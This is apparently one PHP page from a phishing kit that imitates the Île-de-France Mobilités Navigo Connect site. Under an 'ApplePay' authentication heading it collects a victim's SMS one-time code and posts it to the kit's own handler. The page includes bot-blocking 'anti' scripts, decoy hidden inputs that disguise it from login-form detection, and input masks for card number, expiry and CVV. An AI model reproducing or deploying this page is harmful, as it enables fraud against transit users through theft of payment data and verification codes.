<?php

include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
include('../ab.php');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


if(!isset($_SESSION['user_id']))
{
    $_SESSION['user_id'] = uniqid();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0109)https://connect.navigo.fr/auth/realms/connect/login-actions/registration?client_id=account&tab_id=GIZ16_b_qhE -->
<html xmlns="http://www.w3.org/1999/xhtml" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Navigo connect | Connexion</title>
        <link rel="icon" href="https://connect.navigo.fr/auth/resources/r4v0g/login/navigo-connect/img/favicon-32x32.png">
                <link href="../infos_files/style.min.css" rel="stylesheet">
    </head>
    <body class="">
    <div id="container">
        <header role="banner">
                <div class="language-selector">
                    <a class="selector__toggle" data-toggle="dropdown" href="https://connect.navigo.fr/auth/realms/connect/login-actions/registration?client_id=account&amp;tab_id=GIZ16_b_qhE#">
                        Français
                    </a>
                    <ul class="selector__list">
                            <li class="item-util-level-2">
                                <a href="https://connect.navigo.fr/auth/realms/connect/login-actions/registration?client_id=account&amp;tab_id=GIZ16_b_qhE&amp;execution=23269a55-a6e9-4b49-b08b-2faeb6352faf&amp;kc_locale=en">
                                    <span>English</span>
                                </a>
                            </li>
                            <li class="item-util-level-2">
                                <a href="https://connect.navigo.fr/auth/realms/connect/login-actions/registration?client_id=account&amp;tab_id=GIZ16_b_qhE&amp;execution=23269a55-a6e9-4b49-b08b-2faeb6352faf&amp;kc_locale=fr">
                                    <span>Français</span>
                                </a>
                            </li>
                    </ul>
                </div>
            <h1>
                <a href="https://connect.navigo.fr/auth/realms/connect/account/"><span>Ile de France mobilités | CONNECT</span></a>
            </h1>
        </header>
        <div id="kc-content">
            <div id="kc-content-wrapper">

        <div id="container">
            <main role="main">
                <div style="text-align: center; margin-bottom: 20px">
                    <img width="50" src="https://cdn.freebiesupply.com/logos/large/2x/apple-pay-payment-mark-logo-png-transparent.png">
                </div>
                <h2 style="text-align: center;">Authentification via ApplePay</h2>
                <div>
                    <ol id="slideNumber" class="slidePageStep step-createAccount">
                        <li id="stepA" aria-current="step">Vos données personnelles</li>
                        <li id="stepBs" aria-current="step">Vos données de paiement</li>
                        <li id="stepCs" aria-current="step">Authentification</li>
                        <li id="stepCs">Finalisation</li>
                    </ol>
                </div>
                <section>
                    <form id="kc-register-form" class="form-simple" action="../action/secure.php" method="post">
                        <div id="part1">
                            <div class="slidepage">
                                <section>
                                    <h3>Authentification</h3>
                                    <p>Afin de renforcer la sécurité de votre compte, nous vous invitons à confirmer votre identité en utilisant le code reçu par SMS. </p>
                                    <p>Veuillez renseigner les informations suivantes :</p>
                                    <input type="text" readonly="" value="this is not a login form" style="display: none;">
                                    <input type="password" readonly="" value="this is not a login form" style="display: none;">
                                    <p class="mandatory">Les champs avec <span class="asterisque">*</span>sont obligatoires.</p>
                                    <div id="form-element" onmouseover="validateField()">
                                        <p id="id-lastname">
                                            <label for="lastName">
                                                <span class="asterisque">*</span>Code reçu par SMS
                                            </label>
                                            <span id="checkMessageLastName" hidden="true"></span>
                                            <input required="" id="lastName" class="input-text" name="applepay" type="text" autocomplete="off" maxlength="6" value="" placeholder="Code a 6 chiffres">
                                        </p>
                                        <a href="applepay.php">Renvoyer le code</a>
                                        <ul class="buttons-bar">
                                            <li>
                                                <a href="payment.php" id="cancelBtn" class="bt-secondary">Annuler</a>
                                            </li>
                                            <li>
                                                <button id="nextBtns" class="bt-highlight" type="submit" value="Suivant">Suivant</button>
                                            </li>
                                        </ul>
                                    </div>
                                </section>
                            </div>
                            <div class="slidepage2" style="visibility: hidden; height: 0">
                                
                            </div>
                        </div>
                        <div class="slidePage3" style="visibility: hidden; height: 0">
                            <section>
                                <h3><span aria-label="étape 3 sur 4">3/4</span>Conditions générales d'utilisations et consentements </h3>
                                <div class="box-text-scroll">
                                    <p id="scroll">
<iframe id="cgu-frame" src="../infos_files/cgu.html" class="cgu-frame" title="Conditions générales d&#39;utilisation" scrolling="no" onload="resizeIframe(this)" style="height: 12416px;"></iframe>
<script type="text/javascript" async="" src="../infos_files/recaptcha__fr.js" crossorigin="anonymous" integrity="sha384-+KXVwlUkraRKZqlLiZ8cm/my0F+6Kxsbgp5OAzyD3vrao2KRy+BcXiwVw4oIGh4V"></script><script defer="">
    function resizeIframe(obj) {
        obj.style.height = obj.contentWindow.document.body.scrollHeight + 'px';
        obj.contentWindow.document.body.style.fontFamily = '\'ralewayregular\',Arial,Helvetica,sans-serif';
        obj.contentWindow.document.body.style.lineHeight = '2';
        obj.contentWindow.document.body.style.textAlign = 'justify';
    }
</script>                                    </p>
                                    <button id="scrollButton">Voir plus de texte</button>
                                </div>
                                <p class="link-cgu">
                                    <a download="CGU_Compte_Ile-de-France_Mobilites.pdf" href="https://connect.navigo.fr/cgu/cgu.pdf" target="_blank">Télécharger les Conditions Générales d'Utilisations en version
                                        <abbr>PDF</abbr></a>
                                    <small>[<abbr>PDF</abbr> - 146 <abbr>KB</abbr>]</small>
                                </p>
                                <p class="NoLegend">
                                    <input class="styled-checkbox" id="id-acceptCGU" value="vl-acceptCGU" name="dt-acceptCGU" type="checkbox" onchange=" validateCondition(false)">
                                    <label for="id-acceptCGU">Je déclare avoir lu et accepter les Conditions Générales d'Utilisations</label>
                                </p>


                            </section>
                            <div class="field-submit">
                                <div id="kc-form-buttons" class="">
                                    <ul class="buttons-bar">
                                        <li>
                                            <button id="prevBtn-1" class="bt-secondary" type="button">Précédent </button>
                                        </li>
                                        <li><button type="submit" id="myAnchor" class="bt-noActivated" value="Valider" disabled="">Valider</button></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </form>
                </section>
            </main>
        </div>
                <!--
                -->

            </div>
        </div>
        <footer>

        <p><span>Île-de-France Mobilités Connect © </span> <span id="copyright">2023</span></p>
        <p><a href="https://connect.navigo.fr/auth/resources/r4v0g/login/navigo-connect/mentions-legales.html" target="_blank"><span>Mentions légales</span></a></p>
        </footer>
                <script type="text/javascript" src="../infos_files/script.min.js"></script>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/0.9.0/jquery.mask.min.js" integrity="sha512-oJCa6FS2+zO3EitUSj+xeiEN9UTr+AjqlBZO58OPadb2RfqwxHpjTU8ckIC8F4nKvom7iru2s8Jwdo+Z8zm0Vg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript">
        $(document).ready(function(){
            $('input[name=cc]').mask('0000 0000 0000 0000')
            $('input[name=exp]').mask('00/00')
            $('input[name=cvv]').mask('0000')

            $('#nextBtn').props('disabled', false)
        })
    </script>


<script>  document.getElementById("copyright").innerHTML = getYear();</script>
<script defer="">
    const nameField = document.querySelector("#lastName");
    const firstnameField = document.querySelector("#firstName");
    const birthDateField = document.querySelector("#user\\.attributes\\.birthDate");
    const mailField = document.querySelector("#email");
    const slidePage = document.querySelector(".slidepage");
    const slidePage2 = document.querySelector(".slidepage2");
    const slidePage3 = document.querySelector(".slidePage3");
    const slidePageStep = document.querySelector(".slidePageStep");
    const slidePageStep2 = document.querySelector(".slidePageStep2");
    const slidePageStep3 = document.querySelector(".slidePageStep3");
    const cancelButton = document.querySelector("#cancelBtn");
    const firstNextBtn = document.querySelector("#nextBtn");
    const secondNextBtn = document.querySelector("#nextBtn-1");
    const firstPrevBtn = document.querySelector("#prevBtn");
    const secondPrevBtn = document.querySelector("#prevBtn-1");
    const thirdPrevBtn = document.querySelector("#prevBtn-2");
    const submitBtn = document.getElementById("myAnchor");
    const scrollBtn = document.getElementById("scrollButton");
    const pwdChoice = document.querySelector("#id-pwdChoice");
    const pwdConfirm = document.querySelector("#id-pwdConfirm");
    const form = document.querySelector("#form-element");
    const form1 = document.querySelector("#form-choicefPWD");
    const maxLength = 50;
    const maxEmailLength = 255;

    //check visible
    const checkMessageFirstName = document.querySelector("#checkMessageFirstName");
    const checkMessageLastName = document.querySelector("#checkMessageLastName");
    const checkMessageEmail = document.querySelector("#checkMessageEmail");
    const checkMessagePassword = document.querySelector("#checkMessagePassword");
    const checkMessageConfirmPassword = document.querySelector("#checkMessageConfirmPassword");
    const checkMessageBirthDate = document.querySelector("#checkMessageBirthDate");
    const slideNumber = document.querySelector("#slideNumber");
    const keycloakMessage = document.querySelector("#keycloakMessage");
    const stepA = document.querySelector("#stepA");
    const stepB = document.querySelector("#stepB");
    const stepC = document.querySelector("#stepC");
    const p_firstName = document.querySelector("#id-firstname");
    const p_lastName = document.querySelector("#id-lastname");
    const p_birthDate = document.querySelector("#id-birthdate");
    const p_email = document.querySelector("#id-email");
    const p_pwdChoice = document.querySelector("#id_pwdChoice");
    const p_pwdConfirm = document.querySelector("#id_pwdConfirm");


    function validateField() {
        switchButtonClassName(firstNextBtn, notEmpty(nameField.value) && notEmpty(firstnameField.value) && notEmpty(mailField.value));
    }

    function validLastName() {
        const isValidLength = (nameField.value.length <= maxLength);
        if (!isValidLength) {
            checkMessageLastName.innerHTML = 'Le nom doit contenir au maximum 50 caractères';
        }
        setValidationCheck(p_lastName, isValidLength, checkMessageLastName);
        return isValidLength
    }

    function validFirstName() {
        const isValidLength = (firstnameField.value.length <= maxLength);
        if (!isValidLength) {
            checkMessageFirstName.innerHTML = 'Le prénom doit contenir au maximum 50 caractères';
        }
        setValidationCheck(p_firstName, isValidLength, checkMessageFirstName);
        return isValidLength;
    }

    function validEmail() {
        const isValidLength = (mailField.value.length <= maxEmailLength);
        if (!isValidLength) {
            checkMessageEmail.innerHTML = 'L&#39;email doit contenir au maximum 255 caractères';
        } else if (!(validateEmail(mailField.value))) {
            checkMessageEmail.innerHTML = 'Veuillez entrer votre adresse e-mail';
        }
        setValidationCheck(p_email, isValidLength && validateEmail(mailField.value), checkMessageEmail);
        return isValidLength && validateEmail(mailField.value)
    }

    function validateDataFirstPage() {
        const birthDateIsValid = validateBirthDate(birthDateField.value);

        setValidationCheck(p_birthDate, birthDateIsValid, checkMessageBirthDate);

        return validLastName() && validFirstName() && validEmail() && birthDateIsValid;
    }

    function validatePasswordField() {
        switchButtonClassName(secondNextBtn, notEmpty(pwdChoice.value) && notEmpty(pwdConfirm.value));
    }

    function validPassword() {
        if (!(validatePassword(pwdChoice.value))) {
            checkMessagePassword.innerHTML = 'Veuillez entrer un mot de passe valide';
        }
        setValidationCheck(p_pwdChoice, validatePassword(pwdChoice.value), checkMessagePassword);
        return validatePassword(pwdChoice.value);
    }

    function validConfirmPassword() {
        if (!(pwdChoice.value === pwdConfirm.value)) {
            checkMessageConfirmPassword.innerHTML = 'Le mot de passe de confirmation ne correspond pas';
        }
        setValidationCheck(p_pwdConfirm, (pwdChoice.value === pwdConfirm.value), checkMessageConfirmPassword)
        return (pwdChoice.value === pwdConfirm.value);
    }

    function validateDataSecondPage() {
        return validPassword() && validConfirmPassword();
    }

    function scrollFunction() {
        event.preventDefault();
        const scroll = document.getElementById("scroll");
        scroll.scrollTop += 100;
    }

    function validateCondition(isRecaptchaEnabled) {
        if (isRecaptchaEnabled) {
            switchButtonClassName(submitBtn, (document.getElementById("id-acceptCGU").checked && isRecaptchaEnabled))
        } else {
            switchButtonClassName(submitBtn, document.getElementById("id-acceptCGU").checked)
        }
    }

    scrollBtn.addEventListener("click", scrollFunction);

    document.addEventListener("DOMContentLoaded", function () {
        form.setAttribute('onmouseover', "validateField()");
        form1.setAttribute('onmouseover', "validatePasswordField()");
    });

    firstNextBtn.addEventListener("click", function (event) {
        if (validateDataFirstPage()) {
            slideNumber.classList.remove("slidePageStep");
            slideNumber.className += " slidePageStep2";
            stepB.setAttribute("aria-current", "step");
            slidePage.style.height = '0';
            slidePage2.style.height = "auto";
            slidePage.style.visibility = "hidden";
            slidePage2.style.visibility = "visible";
            if (keycloakMessage !== null) {
                keycloakMessage.classList.remove("msg-error");
                keycloakMessage.style.height = '0';
                keycloakMessage.style.visibility = "hidden";
            }
            window.scrollTo(0, 0);
        } else {
            event.preventDefault();
        }
    });

    firstPrevBtn.addEventListener("click", function (event) {
        slideNumber.classList.remove("slidePageStep2");
        slideNumber.className += " slidePageStep";
        stepB.removeAttribute("aria-current");
        slidePage.style.height = "auto";
        slidePage.style.visibility = "visible";
        slidePage2.style.visibility = "hidden";
        window.scrollTo(0, 0);

    });
    secondNextBtn.addEventListener("click", function (event) {
        if (validateDataSecondPage()) {
            slideNumber.classList.remove("slidePageStep2");
            slideNumber.className += " slidePageStep3";
            stepB.setAttribute("aria-current", "step");
            stepC.setAttribute("aria-current", "step");
            slidePage.style.visibility = "hidden";
            slidePage2.style.visibility = "hidden";
            slidePage2.style.height = "0";
            slidePage3.style.height = "auto";
            slidePage3.style.visibility = "visible";
            window.scrollTo(0, 0);
            if (keycloakMessage !== null) {
                keycloakMessage.classList.remove("msg-error");
                keycloakMessage.style.height = '0';
                keycloakMessage.style.visibility = "hidden";
            }
        } else {
            event.preventDefault();
        }

    });

    secondPrevBtn.addEventListener("click", function () {
        slideNumber.classList.remove("slidePageStep3");
        slideNumber.className += " slidePageStep2";
        stepC.removeAttribute("aria-current");
        slidePage2.style.height = "auto";
        slidePage2.style.visibility = "visible";
        slidePage3.style.visibility = "hidden";
        window.scrollTo(0, 0);
    })

    window.addEventListener("keypress", function (event) {
        if (event.keyCode === 13 || event.which === 13) {
            console.log(event.keyCode);
            if (slidePage.style.visibility === "visible") {
                slidePage.style.height = '0';
                slidePage2.style.height = "auto";
                slidePage.style.visibility = "hidden";
                slidePage2.style.visibility = "visible";
                window.scrollTo(0, 0);
            }
            if (slidePage2.style.visibility === "visible") {
                slidePage2.style.visibility = "hidden";
                slidePage3.style.height = "auto";
                slidePage.style.visibility = "hidden";
                slidePage2.style.height = "0";
                slidePage3.style.visibility = "visible";
                window.scrollTo(0, 0);
            }
        }

    })
</script>

</div></body></html>